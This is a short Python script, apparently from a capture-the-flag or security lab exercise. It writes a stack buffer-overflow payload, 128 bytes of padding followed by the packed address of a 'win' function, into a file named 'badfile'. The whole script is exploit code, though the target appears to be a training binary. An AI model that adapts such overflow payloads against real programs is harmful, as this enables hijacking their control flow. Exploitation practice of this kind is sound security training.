import os
import struct

win = 0x804846b

payload = "A"*128
payload += struct.pack("I",win)

f = open("badfile","a")
f.write(payload)
f.close()
